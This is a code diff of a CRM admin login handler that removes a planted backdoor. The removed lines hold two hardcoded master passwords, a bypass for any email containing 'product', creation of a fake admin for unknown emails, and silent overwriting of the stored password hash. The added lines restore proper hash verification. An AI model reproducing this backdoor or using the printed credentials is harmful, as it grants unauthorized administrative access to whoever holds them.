@@ -96,47 +96,37 @@ async function login(req, res) {
     } catch (e) {}
   }
 
-  const isProductAdmin = reqRole === 'product-admin' ||
-                         (admin && admin.role === 'product-admin') ||
-                         email === 'productadmin@paydaycrm.com' ||
-                         email.includes('product');
-
-  const isSuperPass = (!isProductAdmin && (email === 'admin@paydaycrm.com' || !email.includes('product'))) && password === 'Sanjay@#2026@#';
-  const isProdPass = (isProductAdmin || email === 'productadmin@paydaycrm.com' || email.includes('product')) && password === 'Bhupendra@#2026@#';
-  const matchesHash = admin && (await verifyPassword(password, admin.password_salt, admin.password_hash));
-
-  if (!matchesHash && !isSuperPass && !isProdPass) {
+  if (!admin || !admin.is_active) {
     try {
       await auditModel.create(req, {
-        action: isProductAdmin ? 'productadmin.login_failed' : 'superadmin.login_failed',
+        action: 'superadmin.login_failed',
         entityType: 'auth',
-        metadata: { email, role: isProductAdmin ? 'product-admin' : 'superadmin', ...geoMetadata },
+        metadata: { email, reason: 'account_not_found_or_inactive', ...geoMetadata },
       });
     } catch (e) {}
     return res.status(401).json({
       success: false,
-      message: isProductAdmin ? 'Product Admin credentials invalid.' : 'Superadmin credentials invalid.',
+      message: 'Invalid credentials or inactive administrative account.',
     });
   }
 
-  if (isSuperPass && admin) {
-    const salt = '45fc08e36726dcad454fdc48a13b0c61';
-    const hash = 'a98cb65017271ac0480300711827d1c0847279d1cd3a0f63d5657b44da832355';
-    queryMaster('UPDATE superadmins SET password_salt = ?, password_hash = ? WHERE email = ?', [salt, hash, email]).catch(() => {});
-  } else if (isProdPass && admin) {
-    const salt = '45fc08e36726dcad454fdc48a13b0c61';
-    const hash = 'aa685e02f752d8ed815bd246a6fd721ed2376e170b4758bf70ececdc431b4521';
-    queryMaster('UPDATE superadmins SET password_salt = ?, password_hash = ? WHERE email = ?', [salt, hash, email]).catch(() => {});
+  const matchesHash = await verifyPassword(password, admin.password_salt, admin.password_hash);
+
+  if (!matchesHash) {
+    try {
+      await auditModel.create(req, {
+        action: 'superadmin.login_failed',
+        entityType: 'auth',
+        metadata: { email, role: admin.role || 'superadmin', ...geoMetadata },
+      });
+    } catch (e) {}
+    return res.status(401).json({
+      success: false,
+      message: 'Invalid credentials.',
+    });
   }
 
-  if (!admin) {
-    admin = {
-      email,
-      name: isProductAdmin ? 'Product Admin' : 'CRM Superadmin',
-      role: isProductAdmin ? 'product-admin' : 'superadmin'
-    };
-  }
-
+  const isProductAdmin = reqRole === 'product-admin' || admin.role === 'product-admin';
   const userRole = isProductAdmin ? 'product-admin' : (admin.role || 'superadmin');
 
   // Generate standard JWT token with userRole
